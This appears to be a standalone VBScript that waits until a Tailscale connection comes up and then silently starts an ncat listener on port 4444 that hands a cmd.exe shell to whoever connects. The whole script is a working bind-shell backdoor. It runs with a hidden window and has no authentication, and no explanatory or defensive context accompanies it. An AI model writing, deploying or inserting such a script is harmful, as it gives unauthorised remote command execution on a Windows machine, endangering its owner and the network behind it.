Set WshShell = CreateObject("WScript.Shell")

' Define the command to check Tailscale IP
checkCommand = "cmd /c tailscale ip"

' Loop until Tailscale is connected
Do
    Set exec = WshShell.Exec(checkCommand)
    output = ""
    Do While Not exec.StdOut.AtEndOfStream
        output = output & exec.StdOut.ReadLine()
    Loop
    If Left(output, 4) = "100." Then
        Exit Do
    End If
    WScript.Sleep 3000 ' Wait for 3 seconds before retrying
Loop

' Launch ncat listener
WshShell.Run "ncat -l -p 4444 -e cmd.exe", 0, False
